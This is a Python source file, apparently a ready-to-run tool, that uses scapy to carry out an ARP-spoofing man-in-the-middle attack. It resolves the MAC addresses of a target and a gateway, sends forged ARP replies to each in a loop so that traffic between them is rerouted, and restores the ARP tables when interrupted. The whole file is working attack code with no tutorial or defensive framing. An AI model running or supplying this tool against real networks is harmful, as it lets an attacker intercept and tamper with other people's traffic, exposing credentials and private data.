from scapy.all import *
import sys
import os
import time

TARGET_IP = "..."
GATEWAY_IP = "..."

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    for _ in range(3):
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    return None
    
def spoof(target_ip,target_mac, spoof_ip):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = Ether(dst=destination_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(packet, count=4, verbose=False)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Please run as root.")
        sys.exit()
    print(f"[*] Target: {TARGET_IP}, Gateway: {GATEWAY_IP}")
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)
    if not target_mac:
        print(f"[-] Could not find MAC address for target IP: {TARGET_IP}")
        sys.exit()
    else:
        print(f"[+] Target MAC: {target_mac}")
    if not gateway_mac:
        print(f"[-] Could not find MAC address for gateway IP: {GATEWAY_IP}")
        sys.exit()
    else:
        print(f"[+] Gateway MAC: {gateway_mac}")
    print("[!] Executing MITM attack. Press Ctrl+C to stop.")
    try:
        sent_packets = 0
        while True:
            spoof(TARGET_IP, target_mac, GATEWAY_IP)
            spoof(GATEWAY_IP, gateway_mac, TARGET_IP)
            sent_packets += 2
            print(f"\r[+] Packets sent: {sent_packets}\n", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C ! Restoring the network, please wait...")
        restore(TARGET_IP, GATEWAY_IP)
        restore(GATEWAY_IP, TARGET_IP)
        print("[+] Network restored. Exiting.")